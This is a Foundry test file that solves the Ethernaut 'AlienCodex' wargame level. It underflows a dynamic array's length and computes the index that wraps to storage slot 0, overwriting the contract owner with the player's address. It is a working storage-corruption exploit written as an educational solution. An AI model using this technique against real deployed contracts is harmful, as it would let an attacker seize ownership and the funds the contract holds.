// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test} from "forge-std/Test.sol";

/// Ethernaut #19 "AlienCodex" → SC09/storage: dynamic-array underflow (no exact catalog entry; a
/// pre-0.8 storage-corruption class). `retract()` does `codex.length--` on an empty array, underflowing
/// the length to 2^256-1 so the array "covers" all of storage. `revise(i, content)` at the index that
/// wraps to slot 0 overwrites the (packed) owner. Win: owner == player. (AlienCodex is ^0.5.0.)
interface IAlienCodex {
    function makeContact() external;
    function retract() external;
    function revise(uint256 i, bytes32 content) external;
    function owner() external view returns (address);
}

contract AlienCodexTest is Test {
    address player = makeAddr("player");

    function test_solve_aliencodex() public {
        address ac = deployCode("AlienCodex.sol:AlienCodex");

        IAlienCodex(ac).makeContact();
        IAlienCodex(ac).retract(); // codex.length underflows to 2^256 - 1

        // codex data starts at keccak256(slot 1); the index that wraps to slot 0 (owner):
        uint256 idx = type(uint256).max - uint256(keccak256(abi.encode(uint256(1)))) + 1;
        IAlienCodex(ac).revise(idx, bytes32(uint256(uint160(player))));

        assertEq(IAlienCodex(ac).owner(), player, "owner overwritten via array-underflow storage write");
    }
}
